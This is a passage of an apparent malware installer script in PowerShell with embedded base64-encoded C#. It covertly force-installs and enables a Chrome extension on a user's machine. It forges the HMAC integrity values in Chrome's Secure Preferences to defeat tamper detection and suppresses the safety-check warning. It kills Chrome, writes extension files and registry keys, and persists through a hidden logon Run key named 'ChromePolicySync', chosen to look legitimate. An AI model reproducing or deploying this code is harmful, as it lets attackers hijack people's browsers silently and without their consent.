R1cm4gbnVsbDsNCiAgICAgICAgaW50IGJsb2NrRW5kPWV4dFN0YXJ0LCBkZXB0aD0wOw0KICAgICAgICBmb3IgKGludCBpPWV4dFN0YXJ0K2V4dElkLkxlbmd0aCsyO2k8Y29udGVudC5MZW5ndGg7aSsrKSB7IGlmKGNvbnRlbnRbaV09PSd7JylkZXB0aCsrOyBlbHNlIGlmKGNvbnRlbnRbaV09PSd9Jyl7ZGVwdGgtLTtpZihkZXB0aD09MCl7YmxvY2tFbmQ9aTticmVhazt9fSB9DQogICAgICAgIHN0cmluZyBibG9jaz1jb250ZW50LlN1YnN0cmluZyhleHRTdGFydCxibG9ja0VuZC1leHRTdGFydCsxKTsNCiAgICAgICAgc3RyaW5nIHBhdGNoZWQ9U3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4LlJlcGxhY2UoYmxvY2ssIiw/XCJkaXNhYmxlX3JlYXNvbnNcIjpcXFtbXlxcXV0qXFxdIiwiIik7DQogICAgICAgIGlmKCFwYXRjaGVkLkNvbnRhaW5zKCJcInN0YXRlXCI6IikpIHBhdGNoZWQ9cGF0Y2hlZC5SZXBsYWNlKCJcIiIrZXh0SWQrIlwiOnsiLCJcIiIrZXh0SWQrIlwiOntcInN0YXRlXCI6MSwiKTsNCiAgICAgICAgZWxzZSBwYXRjaGVkPVN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleC5SZXBsYWNlKHBhdGNoZWQsIlwic3RhdGVcIjpcXGQrIiwiXCJzdGF0ZVwiOjEiKTsNCiAgICAgICAgaWYoIXBhdGNoZWQuQ29udGFpbnMoIlwiYWNrX3NhZmV0eV9jaGVja193YXJuaW5nXCI6IikpIHBhdGNoZWQ9cGF0Y2hlZC5SZXBsYWNlKCJcIiIrZXh0SWQrIlwiOnsiLCJcIiIrZXh0SWQrIlwiOntcImFja19zYWZldHlfY2hlY2tfd2FybmluZ1wiOnRydWUsIik7DQogICAgICAgIGVsc2UgcGF0Y2hlZD1TeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnMuUmVnZXguUmVwbGFjZShwYXRjaGVkLCJcImFja19zYWZldHlfY2hlY2tfd2FybmluZ1wiOih0cnVlfGZhbHNlKSIsIlwiYWNrX3NhZmV0eV9jaGVja193YXJuaW5nXCI6dHJ1ZSIpOw0KICAgICAgICBjb250ZW50PWNvbnRlbnQuU3Vic3RyaW5nKDAsZXh0U3RhcnQpK3BhdGNoZWQrY29udGVudC5TdWJzdHJpbmcoYmxvY2tFbmQrMSk7DQogICAgICAgIHZhciByb290PWpzcy5EZXNlcmlhbGl6ZTxEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+Pihjb250ZW50KTsNCiAgICAgICAgdmFyIHByb3RlY3Rpb249KERpY3Rpb25hcnk8c3RyaW5nLG9iamVjdD4pcm9vdFsicHJvdGVjdGlvbiJdOyB2YXIgbWFjcz0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0Pilwcm90ZWN0aW9uWyJtYWNzIl07DQogICAgICAgIHZhciBleHRNYWNzPShEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+KW1hY3NbImV4dGVuc2lvbnMiXTsgdmFyIHNldHRpbmdzTWFjcz0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0PilleHRNYWNzWyJzZXR0aW5ncyJdOw0KICAgICAgICB2YXIgZXh0ZW5zaW9ucz0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0PikoKERpY3Rpb25hcnk8c3RyaW5nLG9iamVjdD4pcm9vdFsiZXh0ZW5zaW9ucyJdKVsic2V0dGluZ3MiXTsNCiAgICAgICAgdmFyIGV4dFNldHRpbmdzPShEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+KWV4dGVuc2lvbnNbZXh0SWRdOw0KICAgICAgICBzdHJpbmcgY2Fub25pY2FsPUNhbm9uKGV4dFNldHRpbmdzKTsgc3RyaW5nIG1hY1BhdGg9ImV4dGVuc2lvbnMuc2V0dGluZ3MuIitleHRJZDsgc3RyaW5nIG5ld01hYz1IbWFjKGRldmljZUlkK21hY1BhdGgrY2Fub25pY2FsKTsNCiAgICAgICAgc2V0dGluZ3NNYWNzW2V4dElkXT1uZXdNYWM7IHN0cmluZyBtYWNzQ2Fub25pY2FsPUNhbm9uKG1hY3MpOyBzdHJpbmcgbmV3U3VwZXI9SG1hYyhkZXZpY2VJZCttYWNzQ2Fub25pY2FsKTsNCiAgICAgICAgc3RyaW5nIG9sZE1hY0tleT0iXCIiK2V4dElkKyJcIjpcIiI7IGludCBtYWNzU3RhcnQ9Y29udGVudC5JbmRleE9mKCJcIm1hY3NcIjp7Iik7IGludCBtYWNQb3M9Y29udGVudC5JbmRleE9mKG9sZE1hY0tleSxtYWNzU3RhcnQpOw0KICAgICAgICBpZihtYWNQb3M+MCl7aW50IHZhbFN0YXJ0PW1hY1BvcytvbGRNYWNLZXkuTGVuZ3RoO2ludCB2YWxFbmQ9Y29udGVudC5JbmRleE9mKCJcIiIsdmFsU3RhcnQpO2NvbnRlbnQ9Y29udGVudC5SZW1vdmUodmFsU3RhcnQsdmFsRW5kLXZhbFN0YXJ0KS5JbnNlcnQodmFsU3RhcnQsbmV3TWFjKTt9DQogICAgICAgIHN0cmluZyBzbUtleT0iXCJzdXBlcl9tYWNcIjpcIiI7IGludCBzbVBvcz1jb250ZW50LkluZGV4T2Yoc21LZXkpOw0KICAgICAgICBpZihzbVBvcz49MCl7aW50IHNtVmFsU3RhcnQ9c21Qb3Mrc21LZXkuTGVuZ3RoO2ludCBzbVZhbEVuZD1jb250ZW50LkluZGV4T2YoIlwiIixzbVZhbFN0YXJ0KTtjb250ZW50PWNvbnRlbnQuUmVtb3ZlKHNtVmFsU3RhcnQsc21WYWxFbmQtc21WYWxTdGFydCkuSW5zZXJ0KHNtVmFsU3RhcnQsbmV3U3VwZXIpO30NCiAgICAgICAgcmV0dXJuIGNvbnRlbnQ7DQogICAgfQ0KfQ0KJ0AgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCg0KW0V4dEVuYWJsZV06OkluaXQoJHNlZWQsICRkZXZpY2VJZCkNCiRjID0gW0lPLkZpbGVdOjpSZWFkQWxsVGV4dCgkU2VjUHJlZnNQYXRoLCBbVGV4dC5FbmNvZGluZ106OlVURjgpDQokcCA9IFtFeHRFbmFibGVdOjpQYXRjaCgkYywgJEV4dElkKQ0KaWYgKCRwKSB7IFtJTy5GaWxlXTo6V3JpdGVBbGxUZXh0KCRTZWNQcmVmc1BhdGgsICRwLCAoTmV3LU9iamVjdCBUZXh0LlVURjhFbmNvZGluZygkZmFsc2UpKSkgfQ0K'))

$refresherScript = @"
Start-Sleep 5
`$persistDir = "$persistDir"
`$extId = Get-Content "`$persistDir\ext_id.txt" -ErrorAction SilentlyContinue
if (-not `$extId) { exit }
`$chromeExe = "C:\Program Files\Google\Chrome\Application\chrome.exe"
if (-not (Test-Path `$chromeExe)) { `$chromeExe = "`${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe" }
`$chromeDir = Split-Path `$chromeExe -Parent
`$secPrefs = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Secure Preferences"
`$extDir = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\`$extId\1.0_0"
`$extSrc = "`$persistDir\extension"
`$localUrl = "file:///`$(Join-Path `$persistDir `"update.xml`" -replace '\\','/')"
`$crxPath = "`$persistDir\extension.crx"

Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 2
New-Item -Path `$extDir -ItemType Directory -Force | Out-Null
Copy-Item "`$extSrc\manifest.json" `$extDir -Force
Copy-Item "`$extSrc\sw.js" `$extDir -Force
cmd /c "reg add `"HKCU\Software\Google\Chrome\Extensions\`$extId`" /v update_url /t REG_SZ /d `"`$localUrl`" /f" >nul 2>&1
cmd /c "reg add `"HKCU\Software\Google\Chrome\Extensions\`$extId`" /v path /t REG_SZ /d `"`$crxPath`" /f" >nul 2>&1
cmd /c "reg add `"HKCU\Software\Google\Chrome\Extensions\`$extId`" /v version /t REG_SZ /d 1.0 /f" >nul 2>&1
if (Test-Path `$secPrefs) {
    & powershell -NoProfile -ExecutionPolicy Bypass -File "`$persistDir\enable.ps1" -ExtId `$extId -ChromeDir `$chromeDir -SecPrefsPath `$secPrefs
}
Start-Process `$chromeExe
"@

$refresherPath = Join-Path $persistDir "refresher.ps1"
Set-Content $refresherPath $refresherScript -Encoding UTF8

# Persist via HKCU Run key (user-only, no admin)
$taskAction = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$refresherPath`""
$taskName = "ChromePolicySync"
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value $taskAction
Log "  HKCU Run key $taskName created"

Log "=========================================="
Log "DONE v10 - Policy Extension"
Log "  Extension ID: $extId"
Log "  Persist dir: $persistDir"
Log "  Refresher: $refresherPath (runs at logon)"
Log "  Method: Policy (reg.exe) + HMAC fallback + Run key refresher"
Log "=========================================="
